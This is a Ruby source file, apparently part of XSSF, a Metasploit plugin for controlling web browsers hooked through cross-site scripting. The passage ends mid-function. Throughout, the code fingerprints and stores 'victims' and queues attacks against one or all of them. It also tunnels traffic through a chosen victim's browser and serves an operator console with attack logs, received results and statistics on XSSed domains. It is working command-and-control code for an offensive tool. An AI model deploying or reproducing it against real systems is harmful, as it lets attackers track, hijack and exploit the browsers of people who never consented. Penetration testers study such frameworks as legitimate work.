require 'msf/core/model_xssf'

#
# This class implements a HTTP Server used for the new XSSF plugin.
#
module Msf
	module Xssf
		module XssfDatabase	

			#
			# Saves a victim in the database
			#
			def add_victim(ip, interval, ua)
				case (ua)
					when /version\/(\d+\.\d+[\.\d+]*).*safari/;							ua_name = "SAFARI";				ua_version = $1
					when /firefox\/((:?[0-9]+\.)+[0-9]+)/;								ua_name = "Firefox";			ua_version = $1
					when /mozilla\/[0-9]\.[0-9] \(compatible; msie ([0-9]\.[0-9]+)/;	ua_name = "Internet Explorer";	ua_version = $1
					when /chrome\/((:?[0-9]+\.)+[0-9]+)/;								ua_name = "Google Chrome";		ua_version = $1
					when /opera\/((:?[0-9]+\.)+[0-9]+)/;								ua_name = "Opera";				ua_version = $1
					else 																ua_name = "Unknown";			ua_version = "Unknown"
				end
				
				case (ua)
					when /windows/;		os_name = "Windows";	arch = "ARCH_X86"
					when /linux/;		os_name = "Linux";		arch = "Unknown"
					when /iphone/;		os_name = "MAC OSX";	arch = "armle"
					when /mac os x/;	os_name = "MAC OSX";	arch = "Unknown"
					else				os_name = "Unknown";	arch = "Unknown"
				end
				
				case (ua)
					when /windows 95/;			os_version = '95'
					when /windows 98/;			os_version = '98'
					when /windows nt 4/;		os_version = 'NT'
					when /windows nt 5.0/;		os_version = '2000'
					when /windows nt 5.1/;		os_version = 'XP'
					when /windows nt 5.2/;		os_version = '2003'
					when /windows nt 6.0/;		os_version = 'Vista'
					when /windows nt 6.1/;		os_version = '7'
					when /gentoo/;				os_version = 'Gentoo'
					when /debian/;				os_version = 'Debian'
					when /ubuntu/;				os_version = 'Ubuntu'
					when /android\s(\d+\.\d+)/;	os_version = 'Android (' + $1 + ')'
					else						os_version = 'Unknown'
				end
				
				case (ua)
					when /ppc/;			arch = "ARCH_PPC"
					when /x64|x86_64/;	arch = "ARCH_X86_64"
					when /i.86|wow64/;	arch = "ARCH_X86"
					else				arch = "ARCH_X86"
				end

				begin
					server = DBManager::XssfServer.find(:first, :conditions => [ "active = ?", true ])
					
					return DBManager::XssfVictim.create(
						:xssf_server_id 	=> server.id,
						:ip 				=> ip,
						:active 			=> true,
						:interval 			=> (interval <= 0) ? 1 : ((interval >= 600) ? 600 : interval),
						:location 			=> "Unknown",
						:first_request 		=> Time.now.strftime("%Y-%m-%d %H:%M:%S"),
						:last_request 		=> Time.now.strftime("%Y-%m-%d %H:%M:%S"),
						:tunneled 			=> false,
						:browser_name 		=> ua_name,
						:browser_version 	=> ua_version.slice!(0..15) ,
						:os_name 			=> os_name,
						:os_version 		=> os_version.slice!(0..15) ,
						:arch 				=> arch,
						:current_attack_url => nil,
						:cookie 			=> "NO"
					).id
				rescue
					print_error("Error 4: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
				end
				
				return nil
			end
			
			#
			# Returns a victim with a given id
			#
			def get_victim(id)
				begin
					return  DBManager::XssfVictim.find(id)
				rescue
					print_error("Error 5: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
				end
				
				return nil
			end
			
			#
			# Register a new attack server in the database (if doesn't exist yet)
			#
			def register_server(host, port, uri)
				begin
					DBManager::XssfServer.update_all({:active => false})		
					DBManager::XssfServer.create(:host 	=> host, :port 	=> port, :uri	=> uri,	:active	=> true) if (DBManager::XssfServer.update_all({:active => true}, ["host = ? AND port = ? AND uri = ?", host, port, uri]) == 0)
					return true
				rescue
					print_error("Error 6: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
					return false
				end
			end
			
			#
			# Returns url of active server
			#
			def active_server
				begin
					server = DBManager::XssfServer.find(:first, :conditions => [ "active = ?", true])
					return [server.host, server.port, server.uri]
				rescue
					print_error("Error 7: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
				end
				
				return nil
			end
			
			#
			# Updates all status of actives victims
			# If the victim does not ask for any commands in its (interval + 5) secs time, we consider that its gone
			#
			def update_active_victims
				begin
					DBManager::XssfVictim.find(:all).each do |v|
						begin
							((((Time.now.strftime("%Y-%m-%d %H:%M:%S").to_datetime - v.last_request.to_datetime).to_f * 100000).to_i) > (v.interval + 5).to_i) ? v.active = false : v.active = true

							v.save!
						rescue
							next
						end
					end
				rescue
					print_error("Error 8: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
				end
			end

			#
			# Display a database table
			#
			def show_table(name, klass, conditions = ["1 = 1"], delete = [])
				begin
					default_columns = klass.column_names
					
					delete.each do |i| ; default_columns.delete_if {|v| (v == i)} ; end
					
					table = Rex::Ui::Text::Table.new({'Header'  => name, 'Columns' => default_columns})
					
					klass.find(:all, :conditions => conditions, :order => "id ASC").each do |o|
						columns = default_columns.map { |n| o.attributes[n] || "" }
						table << columns
					end
							
					print_line
					print_line table.to_s
				rescue
					print_error("Error 9: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
				end
			end

			#
			# Desactivate all attacks of database and desactivate victim's attacks
			#
			def clean_database
				begin
					DBManager::XssfVictim.update_all({:current_attack_url => nil, :tunneled => false})
					DBManager::XssfWaitingAttack.delete_all
				rescue
					print_error("Error 10: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
				end
			end

			#
			# Clean a victim of attacks
			#
			def clean_victim(id)
				begin
					if (id && (id != ''))
						DBManager::XssfVictim.update(id, {:current_attack_url => nil, :tunneled => false})
						DBManager::XssfWaitingAttack.delete_all([ "xssf_victim_id = ?", id])
					else
						clean_database
					end
					
				rescue
					print_error("Error 11: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
				end
			end


			#
			# Creates a new attack log in the database
			#
			def create_log(victimID, result, name)
				DBManager::XssfLog.create(:xssf_victim_id => victimID, :name => name, :time => Time.now.strftime("%Y-%m-%d %H:%M:%S"), :result => result)
				# Error => Managed at top level
			end
			
			#
			# Add an attack to a victim in waiting attacks. Add to all active victims if id is nil
			#
			def attack_victim(id, url, name)		
				begin
					if (id && (id != ''))
						if ((DBManager::XssfVictim.find(id)).active)
							DBManager::XssfWaitingAttack.create(
									:xssf_victim_id => id,
									:url => url,
									:name => name
							)
						else
							print_error("Victim '#{id}' is no longer active ! ")
						end
					else
						DBManager::XssfVictim.find(:all, :conditions => [ "active = ?", true]).each do |v|
							DBManager::XssfWaitingAttack.create(
								:xssf_victim_id => v.id,
								:url => url,
								:name => name
							)
						end
					end
					return true
				rescue
					(id && (id != '')) ? print_error("Error adding attack to victim #{id} - Check if victim exists") : print_error("Error adding attack to some victims")
					return false
				end
			end
			
			#
			# Returns current attack running on a victim
			#
			def current_attack(id)
				begin
					id ? v = (DBManager::XssfVictim.find(id)) : v = nil
					
					if (v)
						return v.current_attack_url
					else
						return nil
					end
				rescue
					print_error("Error 12: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
					return nil
				end
			end
			
			#
			# Adds automated attacks for a victim
			#
			def add_auto_attacks(id)
				begin
					Msf::Xssf::AUTO_ATTACKS.each do |a|
						if (obj = framework.jobs[a])
							url = "http://#{(obj.ctx[0].datastore['SRVHOST'] == '0.0.0.0' ? Rex::Socket.source_address('1.2.3.4') : obj.ctx[0].datastore['SRVHOST'])}:#{obj.ctx[0].datastore['SRVPORT']}#{obj.ctx[0].get_resource}"
							DBManager::XssfWaitingAttack.create(
								:xssf_victim_id => id,
								:url => url,
								:name => obj.name
							)
						end
					end
				rescue
					print_error("Error 13: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
				end
			end
			
			#
			# Gets and removes first attack for a victim in waiting attack list
			#
			def get_first_attack(id)
				begin
					attack = DBManager::XssfWaitingAttack.find(:first, :conditions => [ "xssf_victim_id = ?", id])

					if (attack)
						DBManager::XssfVictim.update(id, {:current_attack_url => attack.url})
						DBManager::XssfWaitingAttack.delete(attack.id)
						return [attack.url, attack.name]
					else
						return nil
					end
				rescue
					print_error("Error 14: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
					return nil
				end
			end

			#
			# Specifies a victim to tunnel with
			#
			def tunnel_victim(id)
				begin
					DBManager::XssfWaitingAttack.delete_all([ "xssf_victim_id = ?", id])
					victim = DBManager::XssfVictim.find(id, :conditions => [ "active = ?", true])
					victim.tunneled = true
					victim.save!
					
					TUNNEL.clear
					return victim
				rescue
					print_error("Error 15: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
				end
				
				return nil
			end
			
			#
			# Returns the victim currently tunneled if one
			#
			def victim_tunneled
				begin
					return DBManager::XssfVictim.find(:first, :conditions => [ "tunneled = ? AND active = ?", true, true])
				rescue
					print_error("Error 16: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
				end
				
				return nil
			end
			
			#
			# Updates a victim
			#
			def update_victim(id, location, interval = nil, cookie = "NO")
				begin
					uri = URI.parse(URI.escape(CGI::unescape(location)))
					location = uri.scheme.to_s + "://" + uri.host.to_s + ":" + uri.port.to_s
				rescue
					location = "Unknown"
				end
				
				location = "Unknown" if (location == "://:")
				
				begin
					if (interval)
						DBManager::XssfVictim.update(id, {:last_request => Time.now.strftime("%Y-%m-%d %H:%M:%S"), :active => true, :interval => interval, :location => location, :cookie => cookie})
					else
						DBManager::XssfVictim.update(id, {:last_request => Time.now.strftime("%Y-%m-%d %H:%M:%S"), :active => true, :location => location, :cookie => cookie})
					end
				rescue
					begin
						DBManager::XssfVictim.update(id, {:last_request => Time.now.strftime("%Y-%m-%d %H:%M:%S"), :active => true, :cookie => cookie})
					rescue
						print_error("Error 17: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
					end
				end
			end
			
			
			#
			# Returns the victims curently attacked
			#
			def attacked_victims
				begin
					victims = Hash.new("victims")

					DBManager::XssfWaitingAttack.find(:all, :order => "xssf_victim_id ASC").each do |v|
						victims.has_key?(v.xssf_victim_id) ? (victims[v.xssf_victim_id] = victims[v.xssf_victim_id] + 1) : (victims[v.xssf_victim_id] = 1)
					end
				rescue
					print_error("Error 18: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
				end
				
				if (not victims.empty?)
					str = "Remaining victims to attack: "
					victims.each_pair {|key, value| str << "[#{key} (#{value})] " }
					print_good(str) if not (XSSF_MODE[0] =~ /^Quiet$/i)
				else
					print_good("Remaining victims to attack: NONE") if not (XSSF_MODE[0] =~ /^Quiet$/i)
				end
			end

			
			#
			# Count waiting attacks for given ID
			#
			def count_waiting_attacks(id)
				begin
					return DBManager::XssfWaitingAttack.count(:conditions => ["xssf_victim_id = ?", id])
				rescue
					print_error("Error 19: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
					return 0
				end
			end
			
			
			#
			# Generates XSSF banner page
			#
			def get_html_banner()
				html = %Q{
					<html><body bgcolor=black style="color:cyan; font-family: monospace">
						<pre>#{Xssf::XssfBanner::Logos[2]}</pre><h3 style="position:absolute; right:1%; top:75%" align="right"><u>msf ></u> _</h3>
						<table width="300" height="35" style="border: 1px solid green; position:absolute; left:450px; top:30%">
							<tr align=center>
								<td width="33%" onMouseover="this.bgColor='green'" onMouseout="this.bgColor='black'"
								onClick="parent.location='#{VICTIM_GUI}?#{PARAM_GUI_PAGE}=main';" style="cursor:pointer; border: 1px solid green;">LOGS</td>
								<td width="33%" onMouseover="this.bgColor='green'" onMouseout="this.bgColor='black'"
								onClick="parent.location='#{VICTIM_GUI}?#{PARAM_GUI_PAGE}=stats';" style="cursor:pointer; border: 1px solid green;">STATS</td>
								<td width="33%" onMouseover="this.bgColor='green'" onMouseout="this.bgColor='black'"
								onClick="parent.location='#{VICTIM_GUI}?#{PARAM_GUI_PAGE}=help';" style="cursor:pointer; border: 1px solid green;">HELP</td>
							</tr>
						</table>
					</body></html>
				}
				return html
			end
			
			
			#
			# Generate victims list page
			#
			def get_html_victims()
				html = %Q{
					<html><body bgcolor="#000000">
						<script type="text/javascript">
							var cache = {};
							
							function getElementsById(id){
								if(!cache[id]) {
									var nodes = [];	var tmpNode = document.getElementById(id);
									while(tmpNode) { nodes.push(tmpNode); tmpNode.id = ""; tmpNode = document.getElementById(id); }
									cache[id] = nodes;
								}
								return cache[id];
							}

							function doMenu(item) {
								if (getElementsById(item)[0].style.display == "none") {
									for (var i = 0; i < getElementsById(item).length; i++)
										getElementsById(item)[i].style.display = "";
									document.getElementById(item + "x").innerHTML = "[-]";
								} else {
									for (var i = 0; i < getElementsById(item).length; i++)
										getElementsById(item)[i].style.display = "none";
									document.getElementById(item + "x").innerHTML = "[+]";
								}
							}
						</script>
						
						<table  cellpadding=0 cellspacing=0 border=0 width=100% style="font-family: monospace">
				}
				
				begin
					DBManager::XssfVictim.find(:all, :order => "id ASC").each do |v|
						begin
							secs = (v.last_request - v.first_request).to_i;
							
							html << %Q{
								<tr style="color:#{v.active ? "green" : "red"}; font-family: monospace" align=left>
									<td width=10%><span id="#{v.id}x" onClick="doMenu('#{v.id}')" style="cursor:pointer">[+]</span></td>
									<td width=35%><span onClick="parent.fr2.location='#{VICTIM_GUI}?#{PARAM_GUI_PAGE}=logs&#{PARAM_GUI_VICTIMID}=#{v.id}'; parent.fr3.location='#{VICTIM_GUI}?#{PARAM_GUI_PAGE}=attack'" style="cursor:pointer"><b>Victim #{v.id}</b></span></td>
									<td width=35%><span onClick="parent.fr2.location='#{VICTIM_GUI}?#{PARAM_GUI_PAGE}=logs&#{PARAM_GUI_VICTIMID}=#{v.id}'; parent.fr3.location='#{VICTIM_GUI}?#{PARAM_GUI_PAGE}=attack'" style="cursor:pointer"><b>#{v.ip}</b></span></td>
							}
							
							case v.os_name
								when /Windows/i
									html << %Q{<td width=10% align=center><img width="25px" src="#{XSSF_GUI_FILES}win.png" alt="Windows" /></td>}
								when /Linux/i
									html << %Q{<td width=10% align=center><img width="25px" src="#{XSSF_GUI_FILES}lin.png" alt="Linux" /></td>}
								when /MAX OSX/i
									html << %Q{<td width=10% align=center><img width="25px" src="#{XSSF_GUI_FILES}osx.png" alt="MAX OSX" /></td>}
								else
									html << %Q{<td width=10% align=center><img width="25px" src="#{XSSF_GUI_FILES}unknown.png" alt="Unknown" /></td>}
							end
							
							case v.browser_name
								when /SAFARI/i
									html << %Q{<td width=10% align=center><img width="25px" src="#{XSSF_GUI_FILES}safari.png" alt="SAFARI" /></td>}
								when /Firefox/i
									html << %Q{<td width=10% align=center><img width="25px" src="#{XSSF_GUI_FILES}ff.png" alt="Firefox" /></td>}
								when /Internet Explorer/i
									html << %Q{<td width=10% align=center><img width="25px" src="#{XSSF_GUI_FILES}ie.png" alt="Internet Explorer" /></td>}
								when /Google Chrome/i
									html << %Q{<td width=10% align=center><img width="25px" src="#{XSSF_GUI_FILES}chrome.png" alt="Chrome" /></td>}
								when /Opera/i
									html << %Q{<td width=10% align=center><img width="25px" src="#{XSSF_GUI_FILES}opera.png" alt="Opera" /></td>}
								else
									html << %Q{<td width=10% align=center><img width="25px" src="#{XSSF_GUI_FILES}unknown.png" alt="Unknown" /></td>}
							end
					
							html << %Q{
								</tr> <tr style="display:none" id="#{v.id}" align=center>
									<td COLSPAN=2><div style="color:white">Active ?</div></td>			<td COLSPAN=3 style="color:purple;">#{v.active ? "TRUE" : "FALSE"}</td>
								</tr> <tr style="display:none" id="#{v.id}" align=center>
									<td COLSPAN=2><div style="color:white">IP Address</div></td>		<td COLSPAN=3 style="color:purple;">#{v.ip}</td>
								</tr> <tr style="display:none" id="#{v.id}" align=center>
									<td COLSPAN=2><div style="color:white">OS Name</div></td>			<td COLSPAN=3 style="color:purple;">#{v.os_name}</td>
								</tr> <tr style="display:none;" id="#{v.id}" align=center>
									<td COLSPAN=2><div style="color:white">OS Version</div></td>		<td COLSPAN=3 style="color:purple;">#{v.os_version}</td>
								</tr> <tr style="display:none" id="#{v.id}" align=center>
									<td COLSPAN=2><div style="color:white">Architecture</div></td>		<td COLSPAN=3 style="color:purple;">#{v.arch}</td>
								</tr> <tr style="display:none" id="#{v.id}" align=center>
									<td COLSPAN=2><div style="color:white">Browser name</div></td>		<td COLSPAN=3 style="color:purple;">#{v.browser_name}</td>
								</tr> <tr style="display:none" id="#{v.id}" align=center>
									<td COLSPAN=2><div style="color:white">Browser version</div></td>	<td COLSPAN=3 style="color:purple;">#{v.browser_version}</td>
								</tr> <tr style="display:none" id="#{v.id}" align=center>
									<td COLSPAN=2><div style="color:white">Location</div></td>			<td COLSPAN=3 style="color:purple;"><span onclick="window.open('#{v.location}')" style="cursor:pointer"><u>Go!</u></span></td>
								</tr> <tr style="display:none" id="#{v.id}" align=center>
									<td COLSPAN=2><div style="color:white">XSSF cookie ?</div></td>		<td COLSPAN=3 style="color:purple;">#{(v.cookie == "YES") ? "TRUE" : "FALSE"}</td>
								</tr> <tr style="display:none" id="#{v.id}" align=center>
									<td COLSPAN=2><div style="color:white">First request</div></td>		<td COLSPAN=3 style="color:purple;">#{v.first_request}</td>
								</tr> <tr style="display:none" id="#{v.id}" align=center>
									<td COLSPAN=2><div style="color:white">Last Request</div></td>		<td COLSPAN=3 style="color:purple;">#{v.last_request}</td>
								</tr> <tr style="display:none" id="#{v.id}" align=center>
									<td COLSPAN=2><div style="color:white">Connection time</div></td>	<td COLSPAN=3 style="color:purple;">#{secs/3600}hr #{secs/60 % 60}min #{secs % 60}sec</td>
								</tr>
							}
						rescue
							next
						end
					end
				rescue
					print_error("Error 20: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
				end
				
				return html + "</table></body><html>"
			end

			
			#
			# Exports logs for a victim with a given id
			#
			def get_html_logs(id)
				html = "<html><body bgcolor=black style='font-family:monospace'>"
				
				if (id && (id != 0))
					html << %Q{
						<script>
							var cache = {};
							
							function getElementsById(id){
								if(!cache[id]) {
									var nodes = [];	var tmpNode = document.getElementById(id);
									while(tmpNode) { nodes.push(tmpNode); tmpNode.id = ""; tmpNode = document.getElementById(id); }
									cache[id] = nodes;
								}
								return cache[id];
							}
							
							function displayPage(selectid) {
								var disp0 = "block"; var disp1 = "block";
								
								switch (selectid) {
									case 1: disp1 = "none";	break;
									case 2:	disp0 = "none";	break;
									default: break;	}

								for (var i = 0; i < getElementsById("0").length; i++)	getElementsById("0")[i].style.display = disp0;
								for (var i = 0; i < getElementsById("1").length; i++)	getElementsById("1")[i].style.display = disp1;
							}
						</script>
						
						<center>
							<h3 style="color:cyan"> Victim #{id} attacks </h3>
							<table cellpadding=0 cellspacing=0 border=0 width=70% align=center style="font-family: monospace; color:cyan"><tr>
									<td><input type="radio" name="sel" value="0" onclick="displayPage(0);"> 		All			</td>
									<td><input type="radio" name="sel" value="1" onclick="displayPage(1);"> 		Launched	</td>
									<td><input type="radio" name="sel" value="2" onclick="displayPage(2);" checked> Results		</td>
							</tr></table>
						</center>
					}
					
					begin
						DBManager::XssfLog.find(:all, :conditions => [ "xssf_victim_id = ?", id], :order => "id ASC").each do |l|
							if (l.name == nil)
								html << %Q{	<div id="0" style="color:orange; display:none"><h4> [LOG #{l.id}]: #{URI.unescape(l.result).gsub(/[<>]/, '<' => '&lt;', '>' => '&gt;')} (#{l.time}) </h4></div>	}
							else
								html << %Q{ <span id="1" onClick="parent.fr3.location='#{VICTIM_GUI}?#{PARAM_GUI_PAGE}=attack&#{PARAM_GUI_LOGID}=#{l.id}'" style="cursor:pointer; color:green"><h4> [LOG #{l.id}] : #{CGI::escapeHTML(l.name)} (#{l.time}) </h4></span> }
							end
						end
					rescue
						print_error("Error 21: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
					end
				end
				
				return html + "</body></html>"
			end

			
			#
			# Exports log page with a given log id
			#
			def get_html_attack(logid)
				html = "<html><body bgcolor=black style='font-family:monospace'>"
				
				if (logid && (logid != 0))
					begin
						if (log = DBManager::XssfLog.find(logid))
							html << %Q{
								<center>
									<h3 style="color:cyan"> Attack log #{logid} </h3>
									<form method="GET" action="#{VICTIM_GUI}" >
										<label for="ext" style="color:cyan">Export as...</label>
										<input type=text id="ext" name=#{PARAM_GUI_EXTENTION}  value="Extension" onclick="this.value = '';" >
										<input type=submit value="Download!" >
										<input type="hidden" name="#{PARAM_GUI_PAGE}" value="attack">
										<input type="hidden" name="#{PARAM_GUI_LOGID}" value="#{logid}">
										<input type="hidden" name="#{PARAM_GUI_ACTION}" value="export">
									</form>
								</center>
								<br /><h3 style="color:cyan"> Received result: </h3><div style="color:white">#{(File.open(INCLUDED_FILES + XSSF_LOG_FILES + DBManager::XssfLog.find(logid).result, "rb") {|io| io.read }).gsub(/[<>]/, '<' => '&lt;', '>' => '&gt;')}</div>
							}
						end
					rescue
						print_error("Error 22: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
					end
				end
				
				return html + "</body></html>"
			end	

			#
			# Returns statistics about atacked victims (wether they are always actives or not), in real time
			#
			def get_html_stats()
				html = %Q{
					<html><head>
						<script src="#{XSSF_GUI_FILES}swfobject.js" type="text/javascript"></script>
						<script type="text/javascript">
							function createXHR() {
								if (window.XMLHttpRequest) return new XMLHttpRequest();
			 
								if (window.ActiveXObject) {
									var names = ["Msxml2.XMLHTTP.6.0", "Msxml2.XMLHTTP.3.0", "Msxml2.XMLHTTP", "Microsoft.XMLHTTP"];
									for(var i in names) {
										try{ return new ActiveXObject(names[i]); }
										catch(e){}
									}
								}
							}
				}
				
				for i in (1..5)
					html << %Q{ 
						swfobject.embedSWF("#{XSSF_GUI_FILES}ofc.swf", "gr#{i}", "100%", "275", "9.0.0", "expressInstall.swf", {"data-file":"#{VICTIM_GUI}?#{PARAM_GUI_JSON}%3Dgr#{i}%26#{PARAM_GUI_PAGE}%3Dstat"});
				
						setInterval(update#{i}, 3000);
						
						function update#{i}() {
							chart_#{i} = document.getElementById("gr#{i}");

							xhr#{i} = createXHR();
							xhr#{i}.open("GET", '#{VICTIM_GUI}?#{PARAM_GUI_JSON}=gr#{i}&#{PARAM_GUI_PAGE}=stat&time=' + escape(new Date().getTime()), true);
							xhr#{i}.send(null);
									
							xhr#{i}.onreadystatechange=function() {	if (xhr#{i}.readyState == 4) { chart_#{i}.load(xhr#{i}.responseText); } }
						}
					}
				end

				html << %Q{					
					</script>
					</head><body bgcolor=black style='font-family:monospace'>
						<table width=100% height=95% cellpadding=0 cellspacing=0 cellmargin=0 BORDER>
							<tr>
								<td><div id="gr1"></div></td><td><div id="gr3"></div></td><td rowspan=2 width=40%><div id="gr5"></div></td>
							</tr>
							<tr>
								<td><div id="gr2"></div></td><td><div id="gr4"></div></td>
							</tr>
						</table>
						<center><div style="color:white">Charts provided by <a href="javascript: top.location='http://teethgrinder.co.uk/open-flash-chart/'">"Open Flash Chart"</a></div></center>
					</body></html>
				}
				
				return html
			end
			
			
			#
			# Builds graphs data in real time for statistic page
			#
			def build_json(json)
				begin; code = ""; 	table = Hash.new; 	str = "";	victims = DBManager::XssfVictim.find(:all); rescue; end
				
				colours = %Q{ 	"0x336699", "0x88AACC", "0x999933", "0x666699", "0xCC9933", "0x006666", "0x3399FF", "0x993300", "0xAAAA77", "0x666666", "0xFFCC66", "0x6699CC",
								"0x663366", "0x9999CC", "0xAAAAAA", "0x669999", "0xBBBB55", "0xCC6600", "0x9999FF", "0x0066CC", "0x99CCCC", "0x999999", "0xFFCC00", "0x009999",
								"0x99CC33", "0xFF9900", "0x999966", "0x66CCCC", "0x339966", "0xCCCC33"	}
				case json
					when /^gr1$/			# Active / Non active victims
						total = 0;		active = 0;
						
						begin
							total = DBManager::XssfVictim.count(:all);	active = DBManager::XssfVictim.count(:conditions => ["active = ?", true])
						rescue
							total = 0;	active = 0
						end
				
						code = %Q{ { "elements": [ { "type": "pie", "start-angle": 50, "animate": [ { "type": "fade" },{ "type": "bounce", "distance": 20 } ],
												"on-show": false, "gradient-fill": true, "colours" : ["#00FF00", "#FF0000"], "tip": "#label#\n#val# of #total# (#percent#)", 
												"no-labels": true, "values": [ { "value": #{active}, "label": "Connected", "label-colour": "#00FF00" }, 
												{ "value": #{total - active}, "label": "Disconnected", "label-colour": "#FF0000" }] } ], "bg_colour" : "#000000", 
												"title": { "text": "Active victims",  "style": "color: #00EEEE; font-size: 20px" } }
								}
						
					when /^gr2$/			# Victims location
						victims.each do |v|;	begin;	table[v.location] ? table[v.location] += 1 : table[v.location] = 1;	rescue;	next;	end;	end

						table.each do |key, value|;	str << %Q{ {"value" : #{value.to_i}, "label": "#{key.to_s}", "on-click": "#{key.to_s}" },};	end
						
						code = %Q{	{ "elements": [ { "type": "pie", "start-angle": 50, "on-show": false, "animate": [ { "type": "fade" }, { "type": "bounce", "distance": 20 } ],
												"colours" : [#{colours}], "gradient-fill": true, "tip": "#label#\n#val# of #total# (#percent#)", "no-labels": true, 
												"values": [ #{str[0..-2].to_s} ]}], "bg_colour" : "#000000", "title": { "text": "XSSed domains",  "style": "color: #00EEEE; font-size: 20px" } }
								}

					when /^gr3$/			# Victim OS statistics
						victims.each do |v|
							begin
								table[v.os_name] = Hash.new if not table[v.os_name]
								table[v.os_name][v.os_version] ? table[v.os_name][v.os_version] += 1 : table[v.os_name][v.os_version] = 1
							rescue;	next; end
						end


						table.each do |key, value|;	value.each do |k, v|;	str << %Q{ {"value" : #{v.to_i}, "label": "#{key.to_s} [#{k.to_s}]" },};	end;	end
						
						code = %Q{ { "elements": [ { "type": "pie", "start-angle": 50, "on-show": false, "animate": [ { "type": "fade" }, { "type": "bounce", "distance": 20 } ],
												"colours" : [#{colours}],"gradient-fill": true, "tip": "#label#\n#val# of #total# (#percent#)", "no-labels": true, 
												"values": [ #{str[0..-2].to_s} ]}], "bg_colour" : "#000000", "title": { "text": "Operating Systems",  "style": "color: #00EEEE; font-size: 20px" } }
								}
						
					when /^gr4$/				# Victim browsers statistics
						victims.each do |v|
							begin
								table[v.browser_name] = Hash.new if not table[v.browser_name]
								table[v.browser_name][v.browser_version] ? table[v.browser_name][v.browser_version] += 1 : table[v.browser_name][v.browser_version] = 1
							rescue;	next; end
						end

						table.each do |key, value|;	value.each do |k, v|;	str << %Q{ {"value" : #{v.to_i}, "label": "#{key.to_s} [#{k.to_s}]" },};	end;	end
						
						code = %Q{ { "elements": [ { "type": "pie", "start-angle": 50, "on-show": false,	"animate": [ { "type": "fade" }, { "type": "bounce", "distance": 20 } ],
												"colours" : [#{colours}], "gradient-fill": true, "tip": "#label#\n#val# of #total# (#percent#)", "no-labels": true, 
												"values": [ #{str[0..-2].to_s} ]}], "bg_colour" : "#000000", "title": { "text": "XSSed browsers",  "style": "color: #00EEEE; font-size: 20px" } }
								}
						
					else						# Victim number evolution for the last 10 days
						t = Time.now; 	max = 0;	
						9.downto(0) do |i|;	table[t - (i * 86400)] = 0;	end
							
						victims.each do |v|
							table.each_key do |k|
								time = Time.parse(v.first_request.to_s)
								table[k] += 1 if ((time.year == k.year) and (time.yday == k.yday))
								max = table[k] if (table[k] > max)
							end
						end

						table.each do |key, value|;	str << %Q{ {"x" : #{Time.parse(key.to_s).to_i}, "y": #{value} },};	end
						
						code = %Q{ { "elements": [ { "type": "scatter_line", "colour": "#00FF00", "width": 3, "values": [ #{str[0..-2].to_s} ], 
							"dot-style": { "type": "hollow-dot", "dot-size": 3, "halo-size": 2 } } ], 
							"title": { "text": "Victims number evolution",  "style": "color: #00EEEE; font-size: 20px" }, 
							"x_axis": {"colour": "#00EEEE","grid-colour": "#555555","min": #{(t - (9 * 86400)).to_i}, "max": #{t.to_i}, "steps": 86400, "labels": { 
								"text": "#date:jS, M Y#", "steps": 86400, "visible-steps": 1, "rotate": 270, "colour" : "#FFFFFF" } }, 
							"y_axis": {"colour": "#00EEEE", "grid-colour": "#555555","min": 0, "max": #{max + 5}, "steps": 2, "labels": {"colour" : "#FFFFFF"} },"bg_colour":"#000000" }
						}
				end
				
				return code
			end
			
			
			# 
			# Returns browser name and version of victim with given ID
			#
			def browser_info(id)
				begin
					v = DBManager::XssfVictim.find(id)
					return [v.browser_name.to_s, v.browser_version.to_f, v.os_version.to_s]
				rescue
					print_error("Error 23: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
				end
				
				return ["Unknown", "0"]
			end
			
			
			#
			# Returns content of given log id
			#
			def get_log_content(logid)
				begin
					return File.open(INCLUDED_FILES + XSSF_LOG_FILES + DBManager::XssfLog.find(logid).result, "rb") {|io| io.read }
				rescue
					print_error("Error 24: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
					return nil
				end
			end
			
			
			#
			# Processes all victims inside string with given function
			#
			# Function "attack_victim" => ID's [NONE / ALL (Default) / 1, 2, 6-12]
			# Function "remove_victim"  => ID's [ALL (Default) / 1, 2, 6-12]
			# Function "clean_victim"  => ID's [ALL (Default) / 1, 2, 6-12]
			#
			def process_victims_string(ids, function, url, name)
				if ((ids =~ /^ALL$/) or (ids =~ /^$/))
					case function
						when "attack_victim"
							attack_victim(nil, url, name)
						when "remove_victim"
							remove_victim(nil)
						else #clean_victim
							clean_victim(nil)
					end
				else
					(ids.split(',')).each do |v|
						if (v =~ /^(\d+)-(\d+)$/) 
							($1..$2).each do |id|
								case function
									when "attack_victim"
										attack_victim(id, url, name)
									when "remove_victim"
										remove_victim(id)
									else #clean_victim
										clean_victim(id)
								end
							end
						else
							if (v =~ /^(\d+)$/)
								case function
									when "attack_victim"
										attack_victim($1, url, name)
									when "remove_victim"
										remove_victim($1)
									else #clean_victim
										clean_victim($1)
								end
							else
								print_error("Wrong victim ID or range '#{v}'")
							end
						end
					end
				end
			end
			
			
			#
			# Clear victims in database (alls if id = nil)
			#
			def remove_victim(id)
				begin
					if (id && (id != ''))
						DBManager::XssfWaitingAttack.delete_all([ "xssf_victim_id = ?", id])
						DBManager::XssfLog.delete_all([ "xssf_victim_id = ?", id])
						DBManager::XssfVictim.delete(id)
					else
						DBManager::XssfWaitingAttack.delete_all
						DBManager::XssfLog.delete_all
						DBManager::XssfVictim.delete_all
					end
				rescue
					print_error("Error 25: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
				end
